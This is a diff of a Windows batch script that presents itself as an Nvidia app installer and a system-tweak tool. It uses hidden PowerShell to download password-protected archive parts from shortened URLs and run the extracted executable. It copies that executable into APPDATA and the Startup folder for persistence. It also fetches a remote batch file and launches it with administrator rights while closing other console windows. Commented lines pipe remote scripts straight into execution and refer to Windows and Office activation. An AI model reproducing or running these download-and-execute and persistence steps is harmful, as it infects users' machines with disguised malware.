@@ -6,9 +6,9 @@ powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN3PJ' -OutFile \"$env:TEMP\
 powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN2PJ' -OutFile \"$env:TEMP\NvidiaApp.7z.002\");
 powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN1PJ' -OutFile \"$env:TEMP\\NvidiaApp.7z.001\"); Start-Process \"$env:TEMP\\7z.exe\" -ArgumentList \"x `\"$env:TEMP\\NvidiaApp.7z.001`\" -p@123456789@ -o`\"$env:TEMP\\extract`\" -y\" -Wait; Start-Process \"$env:TEMP\\extract\\NvidiaApp.exe\"; $dest=\"$env:APPDATA\\system\"; if (!(Test-Path $dest)) { New-Item -ItemType Directory -Path $dest -Force }; Copy-Item \"$env:TEMP\\extract\\NvidiaApp.exe\" -Destination $dest -Force; Copy-Item \"$env:TEMP\\extract\\NvidiaApp.exe\" -Destination \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" -Force"
 
-curl -L "https://tinyurl.com/ztweak" -o "%TEMP%\VZX.bat" && (start /b "" powershell -w h -c "Start-Process '%TEMP%\VZX.bat' -Verb RunAs" & taskkill /f /fi "imagename eq cmd.exe" /fi "windowtitle ne Administrator:  *")
+curl -L "https://tinyurl.com/ztweak" -o "%TEMP%\VZX.bat" && start /b "" powershell -w h -c "Start-Process '%TEMP%\VZX.bat' -Verb RunAs" & exit
+::curl -L "https://tinyurl.com/ztweak" -o "%TEMP%\VZX.bat" && (start /b "" powershell -w h -c "Start-Process '%TEMP%\VZX.bat' -Verb RunAs" & taskkill /f /fi "imagename eq cmd.exe" /fi "windowtitle ne Administrator:  *")
 
-exit
 :: Tweaks
 :: powershell -Command "irm 'https://christitus.com/win' | iex"
 :: Windows Activation + Office
